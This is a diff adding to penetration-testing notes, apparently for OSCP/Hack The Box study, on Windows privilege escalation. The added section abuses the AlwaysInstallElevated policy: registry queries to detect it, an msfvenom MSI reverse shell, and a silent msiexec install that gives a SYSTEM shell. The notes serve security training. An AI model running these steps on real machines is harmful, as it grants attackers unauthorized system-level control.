@@ -20,3 +20,13 @@
 # Windows powershell privesc checker#
 1. https://github.com/itm4n/PrivescCheck
 Great Resource: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+
+# MSI # 
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+If you see:
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+1. Make a msfvenom reverse shell for msi (see Love HTB) and execute on target for system reverse shell
+2. msiexec /q /i shell.msi
+
